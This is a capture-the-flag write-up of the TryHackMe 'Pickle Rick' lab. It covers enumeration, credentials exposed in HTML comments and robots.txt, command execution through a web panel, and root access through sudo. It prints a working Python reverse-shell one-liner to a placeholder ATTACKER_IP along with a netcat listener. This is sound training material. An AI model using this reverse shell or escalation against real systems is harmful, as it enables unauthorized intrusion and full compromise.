# Pickle Rick Writeup

## Room Information

**Platform:** TryHackMe  
**Room:** Pickle Rick  
**Difficulty:** Easy  

## Objective

The objective of this room is to exploit a vulnerable web application and retrieve the three secret ingredients hidden on the target machine.

---

# Reconnaissance / Enumeration

The first step was to scan the target machine to identify open ports and services.

```bash
nmap -sC -sV -vv MACHINE_IP
```

The scan revealed that **port 80 (HTTP)** was open, which indicates that a web server is running.

Since a web service was available, the next step was to analyze the website.

---

# Web Inspection

After opening the website in the browser, I inspected the page source.

While reviewing the HTML code, I discovered a username hidden in the comments:

```
R1ckRul3s
```

This indicated that there might be a login portal available somewhere on the website.

---

# Directory Discovery

To discover hidden directories and files, I used Gobuster.

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt -x php, html, txt, zip -o rickmorty.txt
```

The scan revealed several useful paths:

```
/login.php
/robots.txt
```

---

# Robots.txt Analysis

I inspected the `robots.txt` file and discovered the following string:

```
Wubbalubbadubdub
```

This appeared to be a possible password for the login portal.

---

# Initial Access

Using the information gathered earlier, I attempted to log in to the web panel.

**Username**

```
R1ckRul3s
```

**Password**

```
Wubbalubbadubdub
```

The login was successful, which provided access to a command execution panel.

---

# Command Execution

After logging in, I discovered a command panel that allowed system commands to be executed on the target machine.

I began exploring the system using basic Linux commands:

```bash
ls
pwd
whoami
```

This confirmed that command execution was possible through the web interface.

---

# Reverse Shell

To gain a more stable shell, I attempted to establish a reverse shell connection.

First, I opened a listener on my attacking machine:

```bash
nc -lvnp 4400
```

Then I executed a Python reverse shell command from the target machine:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4400));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This successfully connected the target machine back to my attacker machine, providing an interactive shell.

---

# Privilege Escalation

After obtaining shell access, I checked whether elevated privileges were possible.

```bash
sudo -l
```

This revealed that commands could be executed with elevated privileges.

To escalate privileges, I executed:

```bash
sudo bash -i
```

This spawned an interactive root shell.

After this step, I had full **root access** to the system.

---

# Ingredient Collection

Once root access was obtained, I searched the system for the ingredient files.

Using commands such as:

```bash
ls
cat <filename>
more <filename>
less <filename>
```

I navigated through the system and successfully retrieved the **three secret ingredients** required to complete the challenge.

---

# Tools Used

- Nmap
- Gobuster
- Netcat
- Python3
- Linux Commands
- Web Browser

---

# Lessons Learned

This room demonstrates how small pieces of exposed information can lead to full system compromise.

Key techniques practiced in this room:

- Network scanning with **Nmap**
- Web page source code inspection
- Directory discovery using **Gobuster**
- Credential discovery through exposed files
- Establishing a **reverse shell**
- Performing **privilege escalation**
- Navigating Linux systems during exploitation

Overall, this room is a good introduction to web exploitation and privilege escalation techniques in CTF environments.
